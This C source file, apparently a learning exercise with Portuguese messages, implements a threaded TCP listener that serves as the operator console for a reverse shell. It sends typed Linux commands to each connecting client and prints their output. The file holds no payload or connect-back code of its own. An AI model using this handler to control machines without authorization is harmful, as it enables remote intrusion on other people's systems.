#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <string.h>

#define PORT 8080

void *handle_client(void *arg) {
    int client_socket = *(int *)arg;
    free(arg);
    char buffer[1024];
    int read_size;

    printf("Cliente conectado com sucesso!\n");
    printf("Digite comandos do Linux (ex: ls, pwd, whoami):\n\n");

    while(1){
        printf("shell_reversa> ");
        char msg[1024];
        fgets(msg, sizeof(msg), stdin);
        if(strcmp(msg, "exit\n") == 0){
            printf("Cabosse o que era dosse...\n");
            break;
        }
        write(client_socket, msg, strlen(msg));
        memset(buffer, 0, sizeof(buffer));
        read_size = read(client_socket, buffer, sizeof(buffer) - 1);
        
        if(read_size <= 0){
            printf("\nConexao perdida com o cliente.\n");
            break;
        }
        printf("%s", buffer);

    }

    close(client_socket);
    return NULL;
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    
    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            continue;
        }

        int *client_sock = malloc(sizeof(int));
        *client_sock = new_socket;

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, client_sock) < 0) {
            perror("Não foi possível criar a thread");
            free(client_sock);
        }
        pthread_detach(thread_id); // Deixa a thread rodar solta
    }

    close(server_fd);
    return 0;
}